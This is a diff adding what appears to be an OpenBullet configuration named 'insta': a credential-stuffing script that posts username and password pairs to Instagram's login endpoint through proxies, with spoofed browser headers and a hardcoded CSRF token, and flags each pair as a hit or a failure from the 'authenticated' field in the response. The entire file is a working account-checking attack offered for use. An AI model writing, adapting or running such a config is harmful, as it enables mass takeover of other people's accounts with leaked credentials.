@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "insta",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T23:54:31.0685853+03:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.instagram.com/accounts/login/ajax/" 
+  CONTENT "username=<USER>&password=<PASS>&queryParams=%7B%7D&optIntoOneTap=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: el-GR,el;q=0.9,en;q=0.8" 
+  HEADER "content-length: 70" 
+  HEADER "origin: https://www.instagram.com" 
+  HEADER "referer: https://www.instagram.com/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "x-csrftoken: zhyfnT8y6gosM0V0AeVYG3j4QChtrNzs" 
+  HEADER "x-ig-app-id: 936619743392459" 
+  HEADER "x-instagram-ajax: ceefc659ad3e" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"authenticated\": true" 
+  KEYCHAIN Failure OR 
+    KEY "{\"authenticated\": false" 
